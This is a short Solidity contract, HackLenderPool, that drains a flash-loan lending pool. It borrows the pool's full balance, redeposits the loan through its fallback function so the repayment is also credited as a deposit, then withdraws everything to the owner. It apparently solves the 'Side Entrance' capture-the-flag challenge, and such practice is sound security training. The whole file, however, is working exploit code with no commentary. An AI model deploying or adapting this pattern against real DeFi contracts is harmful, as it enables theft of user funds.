// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;
}

contract HackLenderPool {
    address payable private owner;
    ISideEntranceLenderPool private pool;
    uint256 private amount;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        owner = payable(msg.sender);
    }

    receive() external payable {}

    fallback() external payable {
        require(msg.sender == address(pool), "Caller is not pool");
        pool.deposit{value: msg.value}();
    }

    function attack() external payable {
        require(msg.sender == owner, "Caller is not owner");
        amount = address(pool).balance;

        pool.flashLoan(amount);

        pool.withdraw();

        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed.");
    }
}
